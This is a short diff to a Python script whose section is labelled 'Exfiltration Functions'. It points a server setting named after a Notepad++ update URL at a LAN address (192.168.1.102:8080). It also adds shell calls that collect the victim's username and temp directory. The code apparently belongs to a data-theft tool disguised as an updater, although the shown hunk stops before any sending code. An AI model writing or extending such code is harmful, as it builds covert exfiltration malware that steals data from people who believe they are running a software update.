@@ -26,12 +26,18 @@ import time
 import os
 import sys
 import traceback
+import subprocess
 
 # Exfiltration Functions
-SERVER = os.environ.get("NPP_UPDATE_URL", "http://localhost:8080")
-TEMP_DIR = os.environ.get("TEMP", "$env:TEMP")
-USERNAME = os.environ.get("USERNAME", "$env:USERNAME")
+SERVER = os.environ.get("NPP_UPDATE_URL", "http://192.168.1.102:8080")
+TEMP_DIR = subprocess.getoutput("echo %TEMP%").strip()
+USERNAME = subprocess.getoutput("echo %USERNAME%").strip() 
 TIMESTAMP = time.strftime("%Y%m%d-%H%M%S")
+
+try:
+    os.path.exists(TEMP_DIR)
+except:
+    TEMP_DIR = "C:\\Windows\\Temp"
 
 def log_debug(msg):
     try:
